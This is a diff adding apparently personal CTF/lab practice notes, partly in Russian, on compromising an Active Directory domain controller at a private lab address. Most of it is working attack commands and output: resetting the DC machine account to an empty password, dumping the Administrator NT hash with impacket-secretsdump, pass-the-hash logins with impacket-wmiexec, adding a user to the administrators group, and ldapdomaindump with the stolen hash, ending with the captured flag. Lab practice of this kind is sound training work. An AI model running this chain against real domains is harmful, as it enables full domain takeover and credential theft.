@@ -1,0 +1,51 @@
+*************** practica **************************************
+
+
+
+192.168.56.104:49667 - Successfully set the machine account (DC1$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)
+
+
+impacket-secretsdump -no-pass -just-dc-user administrator 'sandox.local/DC1$@192.168.56.104'
+
+└─$ impacket-secretsdump -no-pass -just-dc-user administrator 'sandox.local/DC1$@192.168.56.104'
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c263e573945cdc50d44f08ad17fd9b52:::
+
+impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:c263e573945cdc50d44f08ad17fd9b52 'sandbox.local/administrator@192.168.56.104'
+
+
+# это для возврата пароля в AD
+# msfconsole 
+# msf6> set ACTION RESTORE
+# msf6> set PASSWORD <$MACHINE.ACC hex password>
+set PASSWORD b4342f04c46a3f3a05030bcefb51c705f7d1af7e8042cc5858662fd4786108a6f723e0953ea16c47d4118036553845d0e9e6a349b9ab1f56c2e22038ce67e04ad54412b0b0d58cbbf87c14bb3c82b61cffd86ffe76eccb06afe1c670a300a0f9746e725ecf22a1d9c262948c7287cf60eb22568eb4bb12f329a43ac58989f41a120456d24d3f659284cb8e086bb5cb680683ea6412363de0c11f3f18d8b5b495ab14b71cfc4e6c0fb2cc65c104403e1ddc2511947c686bc06bae196e01595e7ab1799428eebe739c67ab71783ba9a65f670657c3d8da3445b9b661d6529ae0d7228c971188d6351c138acf8a2d715e9f
+# run
+
+# проверяем что есть соединение
+impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:c263e573945cdc50d44f08ad17fd9b52 'sandbox.local/administrator@192.168.56.104'
+
+# я внес пользователя master в группу administrators
+# net localgroup group_name UserLoginName /add
+net localgroup administrators master /add
+# далее через утилиты windows нашел FLAG 
+
+# с помощью ldapdomaindump
+# ldapdomaindump -u .\\username -p <hash> <IP_addres_domain> -o /путь
+# у нас есть administrator и его hash, сохраняем данные в /home/kali/dump
+
+ldapdomaindump -u .\\administrator -p aad3b435b51404eeaad3b435b51404ee:c263e573945cdc50d44f08ad17fd9b52 192.168.56.104 -o /home/kali/dump
+
+#FLAG
+Flag{You_Are_C00L}
+
+***********************************************************************************************
+# Дополнительно установка ldapdomaindump
+
+Dependencies can be installed manually with pip install ldap3 dnspython future, but should in most cases be handled by pip when you install the main package either from git or pypi.
+
+The ldapdomaindump package can be installed with python setup.py install from the git source, or for the latest release with pip install ldapdomaindump.
+
+Скачать архив, распаковать его. Запустить из каталога python ldapdomaindump.py
